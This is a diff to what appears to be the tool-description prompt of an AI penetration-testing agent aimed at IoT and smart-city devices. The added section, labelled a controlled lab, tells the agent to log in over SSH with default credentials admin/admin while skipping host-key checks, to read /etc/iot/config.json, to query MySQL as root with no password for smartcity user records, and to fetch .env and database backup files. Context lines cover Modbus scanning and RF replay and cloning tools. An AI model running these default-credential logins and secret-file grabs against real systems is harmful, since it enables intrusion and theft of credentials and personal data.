@@ -17,6 +17,13 @@
 - **modbus_scan(target, skip_discovery?)** — nmap -sV -p 502. Port 502 open = Modbus TCP (no auth, HIGH severity). Use on PLC/SCADA/HMI devices.
 - **nvd_lookup(query)** — Direct NIST NVD query (no cache). Prefer **cve_search** instead — it is faster and caches results. Use nvd_lookup only if cve_search is unavailable.
 
+### Exploitation tools (controlled lab — real attacks allowed)
+- **ssh_login(command_string)** — SSH login with credentials. Use sshpass: `sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@IP 'id && cat /etc/iot/config.json'`. Returns command output as proof.
+- **mysql_query(host, user, query)** — MySQL/MariaDB query. Try root with no password: mysql_query(host="IP", user="root", query="SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;"). Returns query results.
+- **telnet_connect(command_string)** — TCP connection via netcat: `echo quit | timeout 3 nc IP 23`. Returns banner/response.
+- **ftp_list(url, user?)** — FTP listing: ftp_list("ftp://IP/"). Returns directory contents.
+- **http_get(url)** — HTTP GET with full body. Use to retrieve actual file contents: http_get("http://IP/backup/db_backup.sql"), http_get("http://IP/.env").
+
 ### Physical attack tools (hardware — require physical lab access)
 - **hackrf_capture(frequency, output_file, sample_rate?, num_samples?)** — HackRF One SDR for RF sniffing and replay. Covers Zigbee 802.15.4 (2.4 GHz), LoRaWAN EU868 (868 MHz), sub-GHz (433 MHz). Returns protocol-specific commands.
 - **flipper_zero(protocol, action, frequency?)** — Flipper Zero multi-tool for sub-GHz replay/bruteforce, RFID 125 kHz cloning, NFC 13.56 MHz emulation, IR replay, GPIO/UART bridging.
